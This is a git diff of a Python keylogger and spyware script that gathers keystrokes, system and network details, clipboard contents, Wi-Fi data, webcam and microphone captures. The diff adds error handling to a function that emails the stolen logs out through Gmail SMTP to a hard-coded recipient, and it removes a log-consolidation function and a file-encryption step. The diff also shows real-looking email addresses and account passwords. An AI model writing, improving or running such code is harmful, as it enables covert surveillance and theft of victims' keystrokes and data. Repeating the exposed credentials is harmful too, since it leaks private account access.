@@ -1,4 +1,4 @@
-# Libraries
+# Libraries 
 import os
 import socket
 import platform
@@ -36,11 +36,14 @@ wifi_info = "wifi_info.txt"
 consolidated_log = "consolidated_log.txt"
 
 email_address = "work.nihalrahman@gmail.com"  # Enter email here
-password = "nihalrahman@2005"  # Enter password here
-toaddr = "nd81167@gmail.com"  # Enter recipient email
+password = "ffqefrxfjhhcubhz"  # Enter password here
+
+toaddr = "prabhatbajpai2005@gmail.com"  # Enter recipient email
 file_path = os.getcwd() + "\\"  # File save path
 key = Fernet.generate_key()  # Generate an encryption key
 fernet = Fernet(key)
+
+print("Hit ESC to stop recording")
 
 # Send Email
 def send_email(filename, attachment, toaddr):
@@ -49,18 +52,32 @@ def send_email(filename, attachment, toaddr):
     msg['From'] = fromaddr
     msg['To'] = toaddr
     msg['Subject'] = "Log File"
-    body = "Attached file: " + filename
+    body = f"Attached file: " + filename
     msg.attach(MIMEText(body, 'plain'))
-    with open(attachment, 'rb') as attach_file:
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(attach_file.read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f"attachment; filename= {filename}")
-        msg.attach(part)
-    with smtplib.SMTP('smtp.gmail.com', 587) as s:
-        s.starttls()
-        s.login(fromaddr, password)
-        s.sendmail(fromaddr, toaddr, msg.as_string())
+
+        # Check if the file exists before attaching it
+    if not os.path.exists(attachment):
+        print(f"Error: Attachment file {attachment} not found.")
+        return
+
+    try:
+        with open(attachment, 'rb') as attach_file:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attach_file.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f"attachment; filename={filename}")
+            msg.attach(part)
+
+        # Setup the server and send the email
+        with smtplib.SMTP('smtp.gmail.com', 587) as s:
+            s.starttls()  # Start TLS encryption
+            s.login(fromaddr, password)
+            s.sendmail(fromaddr, toaddr, msg.as_string())
+            print(f"Email sent successfully to {toaddr}")
+    except smtplib.SMTPException as e:
+        print(f"SMTP error occurred: {e}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 # System Information
 def system_information():
@@ -202,38 +219,6 @@ def on_release(key):
     if key == keyboard.Key.esc:
         return False
 
-# Consolidate Data into Readable Format
-def consolidate_data():
-    with open(file_path + consolidated_log, "w") as f:
-        f.write("System Information:\n")
-        with open(file_path + system_info, "r") as sys_info:
-            f.write(sys_info.read())
-        f.write("\nNetwork Activity:\n")
-        with open(file_path + 'network_info.txt', "r") as net_info:
-            f.write(net_info.read())
-        f.write("\nClipboard Data:\n")
-        with open(file_path + clipboard_info, "r") as clipboard_data:
-            f.write(clipboard_data.read())
-        f.write("\nBrowser History:\n")
-        with open(file_path + browser_history_info, "r") as browser_history:
-            f.write(browser_history.read())
-        f.write("\nWi-Fi Networks:\n")
-        with open(file_path + wifi_info, "r") as wifi_data:
-            f.write(wifi_data.read())
-        f.write("\nKey Logs:\n")
-        with open(file_path + keys_info, "r") as key_logs:
-            f.write(key_logs.read())
-
-# # Encrypt Files
-# def encrypt_files(files_to_encrypt):
-#     for file in files_to_encrypt:
-#         with open(file, 'rb') as f:
-#             data = f.read()
-#         encrypted = fernet.encrypt(data)
-#         with open(file + ".encrypted", 'wb') as enc_file:
-#             enc_file.write(encrypted)
-#         # send_email(file + ".encrypted", file + ".encrypted", toaddr)
-
 # Main Execution
 system_information()
 network_activity()
@@ -243,7 +228,12 @@ webcam_capture()
 # fetch_browser_history()
 wifi_info_fetch()
 microphone()
-# consolidate_data()
+
+filename = system_info  # This refers to the file name 'system_info.txt'
+attachment = os.path.join(file_path, system_info)  # Full file path to the system_info.txt file
+toaddr = "nd81167@gmail.com"  # Recipient's email address
+
+send_email(filename,attachment,toaddr)
 
 def run_scheduled_tasks():
     while True:
@@ -259,8 +249,5 @@ schedule_thread = threading.Thread(target=run_scheduled_tasks)
 schedule_thread.daemon = True
 schedule_thread.start()
 
-    # Start the keylogger in the main thread
+# Start the keylogger in the main thread
 start_keylogger()
-
-files_to_encrypt = [file_path + system_info, file_path + keys_info, file_path + clipboard_info, file_path + wifi_info, file_path + consolidated_log]
-encrypt_files(files_to_encrypt)
